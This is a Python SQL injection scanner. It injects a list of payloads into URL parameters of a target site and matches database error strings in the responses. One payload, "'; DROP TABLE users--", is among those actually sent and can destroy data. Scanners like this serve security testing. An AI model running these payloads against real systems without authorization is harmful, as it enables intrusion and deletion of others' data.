import requests
from urllib.parse import urlparse, parse_qs

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "'; DROP TABLE users--",
    "1' AND SLEEP(2)--",
    "1 UNION SELECT NULL--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
]

SQLI_ERRORS = [
    "sql syntax",
    "mysql_fetch",
    "ora-",
    "postgresql",
    "sqlite",
    "syntax error",
    "unclosed quotation",
    "odbc",
    "jdbc",
    "sqlstate",
    "microsoft sql",
    "db2 sql",
    "invalid query",
    "supplied argument is not",
    "warning: mysql",
]

def scan_sqli(url):
    results = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    test_params = list(params.keys()) if params else ["id", "page", "cat", "user", "item"]

    for param in test_params[:3]:
        for payload in SQLI_PAYLOADS[:5]:
            try:
                test_url = f"{url.split('?')[0]}?{param}={requests.utils.quote(payload)}"
                resp = requests.get(test_url, timeout=5, verify=False)
                text_lower = resp.text.lower()

                for error in SQLI_ERRORS:
                    if error in text_lower:
                        results.append({
                            "type": "error_based_sqli",
                            "param": param,
                            "payload": payload,
                            "url": test_url,
                            "error_indicator": error,
                            "message": f"SQL error exposed in parameter '{param}' — possible injection point",
                            "severity": "critical"
                        })
                        break

            except Exception:
                pass

    return results
